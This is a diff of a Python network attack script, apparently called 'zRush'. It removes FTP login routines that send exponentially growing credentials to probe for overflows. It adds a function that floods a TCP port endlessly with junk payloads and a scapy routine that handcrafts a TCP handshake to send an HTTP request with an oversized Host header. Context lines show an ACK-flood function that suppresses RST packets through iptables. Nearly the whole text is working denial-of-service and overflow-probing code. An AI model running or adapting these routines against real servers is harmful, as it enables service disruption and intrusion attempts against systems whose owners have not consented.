@@ -53,59 +53,33 @@ def ACK_attack(src, dst, dport):
         print("Rate:", round(i/runtime,3), "packets per second.")
         os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
 
-def lpacket_raw(src, dst, dport, i):
+def lpacket_raw(src, dst, dport):
+    try:
+        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        c.connect((dst,int(dport)))
+        i = 1
+        start_time = time.time()
+        while(True):
+            c.send(b"X"*512)
+            response = c.recv(4096)
+            print(str(i), "packets sent.", end = "\r")
+            i+=1
+    except KeyboardInterrupt:
+        runtime = time.time()-start_time
+        print(str(i), "packets sent. Runtime", round(runtime,3) ,"seconds.")
+        print("Rate:", round(i/runtime,3), "packets per second.")
+        c.close()
+
+def HTTPhackery(src, dst, dport):
     #syn
     sport = random.randint(1024, 65535)
     ip = IP(src = src, dst = dst)
-    SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
+    SYN = TCP(sport = sport, dport = dport, flags='S')
     SYNACK=sr1(ip/SYN, verbose = 0)
 
     #ack
     ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
-    ftpresponse = sr1(ip/ACK, verbose = 0)
-    print(str(i), "ACK packets sent.", end = "\r")
-
-    raw = Raw(b"X"*1024)
-    i = ftpresponse.seq
-    while(True):
-        TCP_layer = TCP(sport = sport, dport = dport, seq = i, ack = i + 1, flags = 'A')
-        i += 1
-        packet = ip/TCP_layer/raw
-        send(packet, verbose = 0)
-        break
-    """
-    s = TCP_client.tcplink(Raw, dst, dport)
-    print("sending")
-    while(True):
-        #s.send((bytes(("x"*1024).strip(), encoding = 'utf-8')))
-        s.send((bytes(("x"*1024), encoding = 'utf-8')))
-    """
-#send long credentials (ID) when FTP server asks for auth
-def lpacket(src, dst, dport, i):
-    processThread = threading.Thread(target = lpackethandler, args = (src, dst, dport, i,))
-    processThread.start()
-
-
-def lpackethandler(src, dst, dport, i):
-    i = int(i)
-
-    print("Depth", i)
-    ftp = FTP(dst)
-    print("Attempting to log in...")
-    ftp.login(user = ("X"*(2**i)).strip(), passwd = ("X"*(2**i)).strip())
-    ftp.retrlines('LIST')
-
-    """
-    try:
-        print("depth", i)
-        ftp = FTP(dst)
-        print("X"*(2**i))
-        print("logging in")
-        ftp.login(user = ("X"*(2**i)).strip(), passwd = ("X"*(2**i)).strip())
-        ftp.retrlines('LIST')
-    except:
-        print("ftp returned error. Try with bigger string? (y/n)")
-        ret = input("zRush > ")
-        if ret == "y":
-            lpacket(src,dst,dport,i+1)
-            """
+    getStr = 'GET '+ '/general_hardware_information.html HTTP/1.1\r\n'+'Host: '+ dst +'X'*2048+"\r\n\r\n"
+    #print(getStr)
+    reply = sr1(ip/ACK/getStr)
+    print(reply)
